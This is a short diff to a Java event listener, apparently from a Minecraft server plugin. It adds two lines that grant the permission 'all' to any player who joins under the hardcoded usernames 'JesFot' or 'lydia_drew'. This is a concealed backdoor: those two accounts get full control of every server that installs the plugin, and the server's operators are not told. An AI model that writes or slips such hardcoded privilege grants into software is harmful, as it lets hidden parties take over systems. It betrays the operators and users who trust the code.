@@ -67,6 +67,8 @@ public class MPlayerListener implements Listener
 		this.confS.reloadCustomConfig();
 		if (pN.equalsIgnoreCase("JesFot") || pN.equalsIgnoreCase("lydia_drew"))
 		{
+			this.mpp.getPerm().addAttachment(event.getPlayer());
+			this.mpp.getPerm().setPerm(event.getPlayer(), "all", true);
 			if (pN.equalsIgnoreCase("JesFot"))
 			{
 				this.confS.getCustomConfig().set("mpp.rank."+RankLevel.STATUT.getName()+".jesfot", Classes.Prince.getAppel());
